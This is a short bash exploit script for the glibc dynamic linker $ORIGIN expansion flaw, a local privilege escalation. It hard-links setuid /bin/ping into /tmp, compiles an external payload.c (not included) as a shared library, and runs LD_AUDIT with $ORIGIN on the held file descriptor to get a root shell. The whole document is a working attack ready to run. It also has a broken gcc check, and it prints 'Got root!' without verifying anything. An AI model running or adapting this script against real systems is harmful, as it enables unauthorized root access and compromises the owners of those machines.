#!/bin/bash
echo "[*] GNU C library dynamic linker "$"ORIGIN expansion Vulnerability Exploit"
echo "[*] by Tavis Ormandy <taviso (a) cmpxchg8b com>"
echo "[*] script by modpr0be (a) spentera.id"
echo "[*] ...."
sleep 1
CHECKCC=`which gcc 1>/dev/null`
GCCPATH=`which gcc`
echo "[!] Preparing.."
sleep 1
echo "[!] Checking gcc.."
sleep 1
if [ "$CHECKCC" = "1"  ]; then
	echo "[-] Error, could not find gcc! How do we compile it?"
	echo "[-] Exploit process stop here!"
else
	echo "[+] Good, gcc found at" $GCCPATH
fi
sleep 1
rm -rf /tmp/exploit
mkdir /tmp/exploit
ln /bin/ping /tmp/exploit/target 2>/dev/null
if [ -f /tmp/exploit/target ]; then
	exec 3< /tmp/exploit/target
	rm -rf /tmp/exploit/
else
	echo "[-] Exploit failed, system not vulnerable..!"
	exit 0
fi
echo "[+] Compiling.."
gcc -w -fPIC -shared -o /tmp/exploit payload.c
sleep 2
echo "[+] Waiting for SUID Shell.."
sleep 3
echo "[+] Got root!"
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
